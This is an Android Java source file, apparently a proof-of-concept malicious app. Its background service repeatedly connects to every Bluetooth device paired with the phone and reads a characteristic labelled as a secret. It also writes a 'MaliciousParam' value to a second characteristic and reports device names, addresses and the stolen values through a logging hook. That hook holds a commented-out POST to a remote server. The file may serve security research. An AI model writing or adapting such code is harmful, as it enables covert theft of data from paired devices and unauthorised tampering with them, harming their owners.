package org.mmm.bluetoothsomeapp;

import android.app.IntentService;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothGatt;
import android.bluetooth.BluetoothGattCallback;
import android.bluetooth.BluetoothGattCharacteristic;
import android.bluetooth.BluetoothGattService;
import android.bluetooth.BluetoothManager;
import android.content.Context;
import android.content.Intent;
import android.support.annotation.Nullable;
import android.util.Log;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.security.SecureRandom;
import java.util.Set;
import java.util.UUID;

public class MyService extends IntentService {

    private static final UUID SERVICE = UUID.fromString("00001111-0000-1000-8000-00805f9b34fb");
    private static final UUID SECRET_VALUE = UUID.fromString("00000001-8786-40ba-ab96-99b91ac981d8");
    private static final UUID SECRET_OPERATION = UUID.fromString("00000002-8786-40ba-ab96-99b91ac981d8");

    private RequestQueue queue;

    public MyService() {
        super("MyService");
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
//        queue = Volley.newRequestQueue(this);
//        queue.start();
        BluetoothManager bluetoothManager = (BluetoothManager) getSystemService(Context.BLUETOOTH_SERVICE);
        BluetoothAdapter bluetoothAdapter = bluetoothManager.getAdapter();
        while (true) {
            sleep(10 * 1000);
            Set<BluetoothDevice> devices = bluetoothAdapter.getBondedDevices();

            for (final BluetoothDevice d : devices) {
                sendToServer("Device: " + d.getName() + " | " + d.getAddress());
                BluetoothGatt bg = d.connectGatt(this, true, new MyCallback());
                sleep(15 * 1000);
                bg.disconnect();
            }
        }
    }

    private void sendToServer(final String data) {
        Log.i("XXYY", data);
//        StringRequest stringRequest = new StringRequest(Request.Method.POST, "http://192.168.0.110:8000", null, null) {
//            @Override
//            public byte[] getBody() throws AuthFailureError {
//                return data.getBytes();
//            }
//        };
//        queue.add(stringRequest);
    }

    private void sleep(long m) {
        try {
            Thread.sleep(m);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private class MyCallback extends BluetoothGattCallback {

        boolean read = false;
        boolean discover = false;

        @Override
        public void onConnectionStateChange(BluetoothGatt gatt, int status, int newState) {
            if (newState == BluetoothGatt.STATE_CONNECTED && !discover) {
                gatt.discoverServices();
                discover = true;
            }
        }

        @Override
        public void onServicesDiscovered(BluetoothGatt gatt, int status) {
            if (status == BluetoothGatt.GATT_SUCCESS && !read) {
                BluetoothGattService service = gatt.getService(SERVICE);
                if (service != null) {
                    BluetoothGattCharacteristic characteristic = service.getCharacteristic(SECRET_VALUE);
                    if (characteristic != null) {
                        read = gatt.readCharacteristic(characteristic);
                    }
                }
            }
        }

        @Override
        public void onCharacteristicRead(BluetoothGatt gatt, BluetoothGattCharacteristic characteristic, int status) {
            sendToServer("Read: " + new String(characteristic.getValue()));
            BluetoothGattCharacteristic operation = characteristic.getService().getCharacteristic(SECRET_OPERATION);
            if (operation != null) {
                final String maliciousValue = "MaliciousParam" + new SecureRandom().nextInt();
                operation.setValue(maliciousValue);
                sendToServer("Written: " + maliciousValue);
                gatt.writeCharacteristic(operation);
            }
        }
    }
}